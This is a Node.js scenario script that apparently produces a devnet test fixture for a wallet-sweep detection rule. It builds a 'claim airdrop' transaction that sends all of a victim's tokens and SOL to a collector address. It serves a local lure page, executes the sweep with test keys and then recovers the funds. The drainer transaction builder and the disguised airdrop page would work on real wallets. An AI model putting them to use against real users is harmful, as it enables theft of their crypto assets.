#!/usr/bin/env node
/* global Buffer */
// Wallet-sweep scenario on devnet (PLAN.md M6, task S9). The L4 example for G7 (rule wallet.sweep).
//   pnpm --filter @kelvara/scenarios scenario:sweep-devnet              set up, emit the unsigned sweep, serve the page
//   pnpm --filter @kelvara/scenarios scenario:sweep-devnet --attack     set up, then the user really signs the sweep
//   pnpm --filter @kelvara/scenarios scenario:sweep-devnet:attack       attack only, on the last setup
//   options: --no-serve (setup only), --serve-only (page for the last setup)
//
// Helius devnet only. Payer: <main checkout>/.keys/devnet-payer.json (devnet SOL only, never a mainnet key).
// Setup:
//  1. Keys in <worktree>/.keys/devnet/: sweep-user (the victim; Solflare import file sweep-user.solflare.txt),
//     sweep-collector (the attacker's drain address; it never signs the sweep), sweep-mint-a/-b (two plain
//     Token-2022 mints, created once, mint authority = payer).
//  2. The payer tops the user up to 0.05 SOL and mints the user 1,250 of mint A (6 decimals) and 4,200,000 of
//     mint B (9 decimals) into the user's ATAs.
//  3. Builds what the "claim airdrop" page asks for, one transaction, fee payer and only signer the user:
//       per mint: ATA CreateIdempotent(collector) paid by the user, TransferChecked(all of it), CloseAccount(user
//       ATA, rent -> collector); then System Transfer(user -> collector, every lamport left after the fee).
//     The user ends with 0 SOL and no token accounts. -> .devnet/sweep/sweep.unsigned.b64 and scenario.json
//     (addresses, amounts, the fee and the simulation showing the user drained).
// Page: http://localhost:8783 "Claim airdrop", 127.0.0.1 only; it rebuilds the sweep from current balances on a
// fresh blockhash per click and asks Wallet Standard signTransaction (never send).
// Attack: the user signs the emitted bytes (rebuilt if the blockhash expired or balances moved) and submits; the
// script fails unless the user is left with 0 lamports and the collector holds every token. The executed tx is
// stored as fixtures/tx/devnet/sweep/<sig>.json with "e2e": "l4-sweep", then the collector burns the tokens,
// closes its ATAs and returns every lamport to the payer. Net cost per run: ~4 fees (~0.00002 devnet SOL);
// the two mints' rent (~0.003 SOL) is paid once.
import { createHash } from 'node:crypto';
import { chmodSync, existsSync, mkdirSync, readFileSync, renameSync, rmSync, writeFileSync } from 'node:fs';
import { execFileSync } from 'node:child_process';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { heliusDevnet, redact } from './lib/helius.mjs';
import { KEYS, PKG, REPO, exportSolflare, mainCheckout } from './lib/devnet.mjs';
import { TX_FIXTURES, walkFixtures, writeManifest } from './lib/manifest.mjs';
import {
  TOKEN_2022,
  ataAddress,
  burnChecked,
  closeAccount,
  createAccount,
  createAtaIdempotent,
  initializeMint2,
  mintTo,
  parseTokenAccount,
  systemTransfer,
  transferChecked
} from './lib/token2022.mjs';
import { SYSTEM_PROGRAM, b58encode, compileLegacy, readKeypair } from './lib/tx.mjs';
import { parseWireTransaction } from './wire.mjs';

export const OUT = join(PKG, '.devnet', 'sweep');
export const PORT = 8783;
export const USER_FLOAT = 50_000_000; // 0.05 SOL: small on purpose, devnet SOL is limited
export const MINTS = [
  { key: 'sweep-mint-a', label: 'airdrop token A', decimals: 6, amount: 1_250_000_000n }, // 1,250
  { key: 'sweep-mint-b', label: 'airdrop token B', decimals: 9, amount: 4_200_000_000_000_000n } // 4,200,000
];
const MINT_LEN = 82; // plain Token-2022 mint, no extensions
const TOKEN_ACCOUNT_LEN = 170; // Token-2022 ATA: 165 + account type + ImmutableOwner TLV header

const log = (...a) => console.log('[sweep-devnet]', ...a);

function keygen(path) {
  if (existsSync(path)) return;
  execFileSync('solana-keygen', ['new', '--no-bip39-passphrase', '--silent', '-o', path], { stdio: 'ignore' });
  chmodSync(path, 0o600);
}

/** Wire bytes for an unsigned legacy tx: signature slots zeroed. */
export function unsignedWire(compiled) {
  return Buffer.concat([Buffer.from([compiled.signers.length]), Buffer.alloc(64 * compiled.signers.length), Buffer.from(compiled.message)]);
}

/**
 * The sweep the page asks for. Pure: given the user's lamports and token holdings, every token and every lamport
 * but the fee ends at `collector`. `fee` is the network fee for this message (5000 per signature on devnet);
 * `ataRent` what the user pays for each collector ATA it creates.
 * `plain`: the collector's ATAs already exist (the attacker pre-created them), so the tx is only TransferChecked
 * per token + one System Transfer, and the user's emptied ATAs stay open (sweep-local, the G7 L4 case).
 */
export function buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash, plain = false }) {
  const instructions = [];
  for (const t of tokens) {
    const from = ataAddress(user, t.mint);
    if (!plain) instructions.push(createAtaIdempotent(user, collector, t.mint));
    instructions.push(transferChecked(from, t.mint, ataAddress(collector, t.mint), user, t.amount, t.decimals));
    if (!plain) instructions.push(closeAccount(from, collector, user));
  }
  const sol = lamports - fee - (plain ? 0 : ataRent * tokens.length);
  if (sol <= 0) throw new Error(`user has ${lamports} lamports, not enough to pay the sweep`);
  instructions.push(systemTransfer(user, collector, sol));
  const compiled = compileLegacy({ feePayer: user, instructions, recentBlockhash });
  return { compiled, wire: unsignedWire(compiled), sol };
}

const balance = async (rpc, pk) => (await rpc.call('getBalance', [pk, { commitment: 'confirmed' }])).value;

async function tokenAmount(rpc, ata) {
  const { value } = await rpc.call('getAccountInfo', [ata, { encoding: 'base64', commitment: 'confirmed' }]);
  return value ? parseTokenAccount(Buffer.from(value.data[0], 'base64')).amount : null;
}

async function context() {
  const payerPath = join(mainCheckout(), '.keys', 'devnet-payer.json');
  if (!existsSync(payerPath)) throw new Error('NEEDS_HUMAN: fund .keys/devnet-payer.json in the main checkout with devnet SOL; never a mainnet key');
  const rpc = await heliusDevnet(REPO);
  mkdirSync(KEYS, { recursive: true, mode: 0o700 });
  for (const k of ['sweep-user', 'sweep-collector', ...MINTS.map((m) => m.key)]) keygen(join(KEYS, `${k}.json`));
  const kp = (k) => readKeypair(join(KEYS, `${k}.json`));
  return { rpc, payer: readKeypair(payerPath), user: kp('sweep-user'), collector: kp('sweep-collector'), mints: MINTS.map((m) => ({ ...m, kp: kp(m.key), mint: kp(m.key).publicKey })) };
}

/** Builds the sweep from the user's current on-chain balances, on a fresh blockhash. */
export async function currentSweep(rpc, { user, collector, mints, plain = false }) {
  const tokens = [];
  for (const m of mints) {
    const amount = await tokenAmount(rpc, ataAddress(user, m.mint));
    if (amount === null) throw new Error(`user has no ATA for ${m.mint}; run setup`);
    if (amount > 0n) tokens.push({ mint: m.mint, decimals: m.decimals, amount });
  }
  const lamports = await balance(rpc, user);
  const ataRent = await rpc.call('getMinimumBalanceForRentExemption', [TOKEN_ACCOUNT_LEN]);
  const { value: bh } = await rpc.call('getLatestBlockhash', [{ commitment: 'confirmed' }]);
  const draft = buildSweep({ user, collector, tokens, lamports, fee: 0, ataRent, recentBlockhash: bh.blockhash, plain });
  const { value: fee } = await rpc.call('getFeeForMessage', [Buffer.from(draft.compiled.message).toString('base64'), { commitment: 'confirmed' }]);
  if (typeof fee !== 'number') throw new Error('getFeeForMessage returned no fee');
  const built = buildSweep({ user, collector, tokens, lamports, fee, ataRent, recentBlockhash: bh.blockhash, plain });
  return { ...built, tokens, lamports, fee, ataRent, recentBlockhash: bh.blockhash, lastValidBlockHeight: bh.lastValidBlockHeight };
}

export async function setup() {
  const c = await context();
  const { rpc, payer, user, collector } = c;
  log(`payer ${payer.publicKey}: ${(await balance(rpc, payer.publicKey)) / 1e9} SOL`);

  // 1. mints, once
  const mintRent = await rpc.call('getMinimumBalanceForRentExemption', [MINT_LEN]);
  for (const m of c.mints) {
    const { value } = await rpc.call('getAccountInfo', [m.mint, { encoding: 'base64', commitment: 'confirmed' }]);
    if (value) continue;
    const s = await rpc.send([createAccount(payer.publicKey, m.mint, mintRent, MINT_LEN, TOKEN_2022), initializeMint2(m.mint, m.decimals, payer.publicKey, null)], payer, [m.kp]);
    log(`created ${m.label} mint ${m.mint}: ${s}`);
  }

  // 2. user float and tokens
  const have = await balance(rpc, user.publicKey);
  const ix = [];
  if (have < USER_FLOAT) ix.push(systemTransfer(payer.publicKey, user.publicKey, USER_FLOAT - have));
  for (const m of c.mints) {
    const ata = ataAddress(user.publicKey, m.mint);
    const held = (await tokenAmount(rpc, ata)) ?? 0n;
    ix.push(createAtaIdempotent(payer.publicKey, user.publicKey, m.mint));
    if (held < m.amount) ix.push(mintTo(m.mint, ata, payer.publicKey, m.amount - held));
  }
  const need = Math.max(0, USER_FLOAT - have) + 2 * 3_000_000;
  if ((await balance(rpc, payer.publicKey)) < need) throw new Error('NEEDS_HUMAN: devnet payer needs more devnet SOL');
  const fundSig = await rpc.send(ix, payer, []);
  log(`user ${user.publicKey} funded to 0.05 SOL + airdrop tokens: ${fundSig}`);

  // 3. the request the page makes
  const sw = await currentSweep(rpc, { user: user.publicKey, collector: collector.publicKey, mints: c.mints });
  const watched = [user.publicKey, collector.publicKey, ...sw.tokens.flatMap((t) => [ataAddress(user.publicKey, t.mint), ataAddress(collector.publicKey, t.mint)])];
  const pre = (await rpc.call('getMultipleAccounts', [watched, { encoding: 'base64', commitment: 'confirmed' }])).value;
  const sim = await rpc.call('simulateTransaction', [
    sw.wire.toString('base64'),
    { encoding: 'base64', sigVerify: false, replaceRecentBlockhash: false, commitment: 'confirmed', accounts: { encoding: 'base64', addresses: watched } }
  ]);
  if (sim.value.err) throw new Error(`sweep simulation failed: ${JSON.stringify(sim.value.err)} ${JSON.stringify(sim.value.logs)}`);
  const post = sim.value.accounts;
  const lamportsDelta = Object.fromEntries(watched.map((p, i) => [p, (post[i]?.lamports ?? 0) - (pre[i]?.lamports ?? 0)]));
  // Depending on the RPC node, simulated post-balances include the fee (user at 0) or not (user at exactly the fee).
  const userPost = post[0]?.lamports ?? 0;
  if (userPost !== 0 && userPost !== sw.fee) throw new Error(`simulation leaves the user ${userPost} lamports (fee ${sw.fee})`);
  const userAfter = 0;
  const tokenPost = sw.tokens.map((t, i) => {
    const acc = post[3 + 2 * i];
    return { mint: t.mint, decimals: t.decimals, amount: t.amount.toString(), collectorAfter: acc ? parseTokenAccount(Buffer.from(acc.data[0], 'base64')).amount.toString() : null, userAtaClosed: !post[2 + 2 * i] || post[2 + 2 * i].lamports === 0 };
  });
  for (const t of tokenPost) if (t.collectorAfter !== t.amount || !t.userAtaClosed) throw new Error(`simulation: token ${t.mint} not fully swept`);

  mkdirSync(OUT, { recursive: true });
  writeFileSync(join(OUT, 'sweep.unsigned.b64'), sw.wire.toString('base64') + '\n');
  const scenario = {
    scenario: 'sweep-devnet',
    createdAt: new Date().toISOString(),
    network: 'devnet',
    chain: 'solana:devnet',
    user: user.publicKey,
    collector: collector.publicKey,
    funding: { signature: fundSig, lamports: sw.lamports },
    tokens: sw.tokens.map((t) => ({ mint: t.mint, decimals: t.decimals, amount: t.amount.toString(), label: c.mints.find((m) => m.mint === t.mint).label })),
    sweep: {
      file: 'packages/scenarios/.devnet/sweep/sweep.unsigned.b64',
      recentBlockhash: sw.recentBlockhash,
      lastValidBlockHeight: sw.lastValidBlockHeight,
      feePayer: user.publicKey,
      signers: sw.compiled.signers,
      missingSignatures: [user.publicKey],
      fee: sw.fee,
      solToCollector: sw.sol,
      instructions: [
        ...sw.tokens.flatMap(() => ['ATA CreateIdempotent(collector) paid by user', 'Token-2022 TransferChecked all -> collector', 'Token-2022 CloseAccount user ATA, rent -> collector']),
        'System Transfer all remaining lamports user -> collector'
      ],
      simulation: { err: null, unitsConsumed: sim.value.unitsConsumed, userLamportsPost: userPost, userLamportsAfterFee: userAfter, lamportsDelta, tokens: tokenPost }
    },
    expect: { rule: 'wallet.sweep', level: 'L4' },
    keyFiles: { user: '.keys/devnet/sweep-user.json', collector: '.keys/devnet/sweep-collector.json', solflare: '.keys/devnet/sweep-user.solflare.txt' }
  };
  writeFileSync(join(OUT, 'scenario.json'), JSON.stringify(scenario, null, 2) + '\n');
  exportSolflare(join(KEYS, 'sweep-user.json'), join(KEYS, 'sweep-user.solflare.txt'));
  log(`sweep tx (unsigned, ${sw.wire.length} bytes) -> ${scenario.sweep.file}`);
  log(`Solflare private-key import file: ${join(KEYS, 'sweep-user.solflare.txt')} (devnet only; contents never logged)`);
  log(`expected: wallet.sweep L4 (all ${sw.lamports / 1e9} SOL and ${sw.tokens.length} tokens -> ${collector.publicKey}, which does not sign)`);
  return scenario;
}

/** Stores the executed sweep from devnet as the single l4-sweep e2e fixture and rebuilds the manifest. */
export async function recordFixture(rpc, sig, scenario, request) {
  const res = await rpc.call('getTransaction', [sig, { encoding: 'base64', maxSupportedTransactionVersion: 0, commitment: 'confirmed' }]);
  if (!res) throw new Error(`getTransaction ${sig}: not found`);
  if (res.meta?.err !== null) throw new Error(`${sig} failed on chain`);
  const bytes = Buffer.from(res.transaction[0], 'base64');
  if (parseWireTransaction(bytes).signatures[0] !== sig) throw new Error('first signature differs');
  for (const f of walkFixtures()) if (JSON.parse(readFileSync(f, 'utf8')).e2e === 'l4-sweep' && !f.endsWith(`${sig}.json`)) rmSync(f);
  const record = {
    schema: 'kelvara.fixture.tx/v1',
    network: 'devnet',
    signature: sig,
    slot: res.slot,
    blockTime: res.blockTime ?? null,
    fetchedAt: new Date().toISOString(),
    source: 'helius-devnet:getTransaction',
    program: { slug: 'system', programId: SYSTEM_PROGRAM, priority: 'P0', name: 'System' },
    encoding: 'base64',
    transaction: res.transaction[0],
    sha256: createHash('sha256').update(bytes).digest('hex'),
    version: res.version ?? 'legacy',
    invocation: 'top-level',
    meta: res.meta,
    label: `scenario:sweep-devnet: "claim airdrop" sweep, the user's ${scenario.tokens.length} token balances, both ATAs' rent and every lamport but the fee to ${scenario.collector} (not a signer); executed on devnet`,
    tags: ['scenario', 'sweep'],
    e2e: 'l4-sweep',
    // What the page asked for, before execution: the user still held everything, so this is the state the
    // sweep simulates against (after execution the user is empty and a re-simulation fails).
    request: { user: scenario.user, collector: scenario.collector, tokens: scenario.tokens, ...request }
  };
  const dir = join(TX_FIXTURES, 'devnet', 'sweep');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, `${sig}.json`), JSON.stringify(record, null, 2) + '\n');
  log(`l4-sweep -> fixtures/tx/devnet/sweep/${sig}.json`);
  writeManifest();
  return join(dir, `${sig}.json`);
}

export async function attack({ fixture = true } = {}) {
  const s = JSON.parse(readFileSync(join(OUT, 'scenario.json'), 'utf8'));
  const c = await context();
  const { rpc, payer, user, collector } = c;
  if (user.publicKey !== s.user || collector.publicKey !== s.collector) throw new Error('keys differ from the last setup; run setup again');

  let wire = Buffer.from(readFileSync(join(OUT, 'sweep.unsigned.b64'), 'utf8').trim(), 'base64');
  let rebuilt = false;
  let request = { lamports: s.funding.lamports, fee: s.sweep.fee, solToCollector: s.sweep.solToCollector, simulation: s.sweep.simulation };
  const { value: valid } = await rpc.call('isBlockhashValid', [s.sweep.recentBlockhash, { commitment: 'confirmed' }]);
  if (!valid || (await balance(rpc, user.publicKey)) !== s.funding.lamports) {
    const sw = await currentSweep(rpc, { user: user.publicKey, collector: collector.publicKey, mints: c.mints });
    wire = sw.wire;
    rebuilt = true;
    request = { lamports: sw.lamports, fee: sw.fee, solToCollector: sw.sol, simulation: null };
    log('emitted sweep expired or balances moved; rebuilt from current balances on a fresh blockhash');
  }
  const unsigned = Buffer.from(wire).toString('base64');
  const collectorBefore = await balance(rpc, collector.publicKey);
  const message = wire.subarray(1 + 64 * wire[0]);
  const sig = Buffer.from(user.sign(message));
  sig.copy(wire, 1);
  const sweepSig = b58encode(sig);
  await rpc.call('sendTransaction', [wire.toString('base64'), { encoding: 'base64', preflightCommitment: 'confirmed' }]);
  await rpc.confirm(sweepSig);

  const userAfter = await balance(rpc, user.publicKey);
  const collectorAfter = await balance(rpc, collector.publicKey);
  const tokens = [];
  for (const m of c.mints) {
    tokens.push({ mint: m.mint, userAta: await tokenAmount(rpc, ataAddress(user.publicKey, m.mint)), collector: await tokenAmount(rpc, ataAddress(collector.publicKey, m.mint)) });
  }
  if (userAfter !== 0) throw new Error(`user still holds ${userAfter} lamports after the sweep`);
  for (const t of tokens) if (t.userAta !== null || !t.collector) throw new Error(`token ${t.mint} not swept`);
  log(`user signed the "claim airdrop": ${sweepSig}. User now holds 0 SOL and no token accounts; collector gained ${(collectorAfter - collectorBefore) / 1e9} SOL + all tokens.`);

  const fixturePath = fixture ? await recordFixture(rpc, sweepSig, s, { transactionUnsigned: unsigned, rebuilt, ...request }) : null;

  // Recovery: the collector burns the tokens, closes its ATAs (rent -> payer) and returns every lamport to the payer.
  const recover = [];
  for (const m of c.mints) {
    const ata = ataAddress(collector.publicKey, m.mint);
    const amt = await tokenAmount(rpc, ata);
    if (amt === null) continue;
    if (amt > 0n) recover.push(burnChecked(ata, m.mint, collector.publicKey, amt, m.decimals));
    recover.push(closeAccount(ata, payer.publicKey, collector.publicKey));
  }
  const fee = 5000;
  recover.push(systemTransfer(collector.publicKey, payer.publicKey, collectorAfter - fee));
  const recoverSig = await rpc.send(recover, collector, []);
  log(`collector burned the tokens and returned everything to the payer: ${recoverSig}`);
  const result = {
    sweepSignature: sweepSig,
    sweepRebuilt: rebuilt,
    collectorGainedLamports: collectorAfter - collectorBefore,
    userLamportsAfter: userAfter,
    tokens: tokens.map((t) => ({ mint: t.mint, collector: t.collector.toString() })),
    fixture: fixturePath ? fixturePath.slice(REPO.length + 1) : null,
    recoverSignature: recoverSig,
    at: new Date().toISOString()
  };
  writeFileSync(join(OUT, 'attack.json'), JSON.stringify(result, null, 2) + '\n');
  return result;
}

export async function serve() {
  const { serveAttacker } = await import('./lib/attacker-page.mjs');
  const s = JSON.parse(readFileSync(join(OUT, 'scenario.json'), 'utf8'));
  const c = await context();
  const ctx = { out: OUT, keys: KEYS, rpc: c.rpc, sweepWire: async () => (await currentSweep(c.rpc, { user: c.user.publicKey, collector: c.collector.publicKey, mints: c.mints })).wire.toString('base64') };
  return serveAttacker('sweep', ctx, s, { port: PORT });
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  const args = process.argv.slice(2);
  const unknown = args.filter((a) => !['--attack', '--attack-only', '--no-serve', '--serve-only'].includes(a));
  try {
    if (unknown.length) throw new Error('unknown options: ' + unknown.join(' '));
    if (args.includes('--attack-only')) await attack();
    else {
      if (!args.includes('--serve-only')) {
        if (existsSync(join(OUT, 'attack.json')) && existsSync(join(OUT, 'scenario.json'))) renameSync(OUT, `${OUT}-archive-${Date.now()}`);
        await setup();
      }
      if (args.includes('--attack')) await attack();
      else if (!args.includes('--no-serve')) await serve();
    }
  } catch (e) {
    console.error(`[sweep-devnet] FAIL ${redact(e?.message ?? e)}`);
    process.exit(1);
  }
}
